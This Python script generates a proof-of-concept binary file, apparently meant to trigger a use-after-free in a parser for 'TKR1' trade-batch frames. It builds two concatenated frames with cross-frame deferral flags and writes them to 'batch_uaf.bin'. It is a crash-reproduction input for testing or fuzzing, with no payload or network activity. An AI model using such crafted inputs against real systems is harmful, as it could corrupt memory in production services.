#!/usr/bin/env python3
"""Build cross-frame BatchFuzzer PoC: two TKR1 frames concatenated."""

from __future__ import annotations

import struct
from pathlib import Path

K_BATCH_MAGIC = 0x544B5231
K_WIRE_VERSION = 7
K_HEADER_BYTES = 28
K_BATCH_FLAG_DEFERRED_DIGEST = 1 << 3
K_BATCH_FLAG_CROSS_FRAME_DEFER = 1 << 6

SESSION_DESK_ID = 42
TRADE_DATE = 20260730
META_RECORD_ID = 0


def u32le(value: int) -> bytes:
    return struct.pack("<I", value)


def u16le(value: int) -> bytes:
    return struct.pack("<H", value)


def encode_record(
    record_id: int,
    account_id: int,
    symbol_id: int,
    qty_milli: int,
    price_tick: int,
    payload_offset: int,
    payload_len: int,
    flags: int = 0,
) -> bytes:
    return b"".join(
        u32le(x)
        for x in (
            record_id,
            account_id,
            symbol_id,
            qty_milli,
            price_tick,
            payload_offset,
            payload_len,
            flags,
        )
    )


def encode_batch_frame(
    sequence: int,
    data_record_id: int,
    payload_offset: int,
    payload_len: int,
    payload: bytes,
) -> bytes:
    flags = K_BATCH_FLAG_DEFERRED_DIGEST | K_BATCH_FLAG_CROSS_FRAME_DEFER
    meta = encode_record(
        record_id=META_RECORD_ID,
        account_id=sequence,
        symbol_id=0,
        qty_milli=1000,
        price_tick=100,
        payload_offset=0,
        payload_len=0,
    )
    data = encode_record(
        record_id=data_record_id,
        account_id=100 + sequence,
        symbol_id=7,
        qty_milli=5000,
        price_tick=250,
        payload_offset=payload_offset,
        payload_len=payload_len,
    )
    header = b"".join(
        [
            u32le(K_BATCH_MAGIC),
            u16le(K_WIRE_VERSION),
            u16le(K_HEADER_BYTES),
            u32le(2),
            u32le(flags),
            u32le(SESSION_DESK_ID),
            u32le(TRADE_DATE),
            u32le(0),
        ]
    )
    return header + meta + data + payload


def build_poc() -> bytes:
    frame1_payload = bytes([0xA0 + (i % 16) for i in range(60)])
    frame1 = encode_batch_frame(
        sequence=1,
        data_record_id=1,
        payload_offset=40,
        payload_len=20,
        payload=frame1_payload,
    )

    frame2_payload = bytes([0xB0 + (i % 16) for i in range(24)])
    frame2 = encode_batch_frame(
        sequence=2,
        data_record_id=2,
        payload_offset=0,
        payload_len=24,
        payload=frame2_payload,
    )
    return frame1 + frame2


def main() -> None:
    poc = build_poc()
    out = Path(__file__).resolve().parents[1] / "batch_uaf.bin"
    out.write_bytes(poc)
    print(f"Wrote {len(poc)} bytes to {out}")


if __name__ == "__main__":
    main()
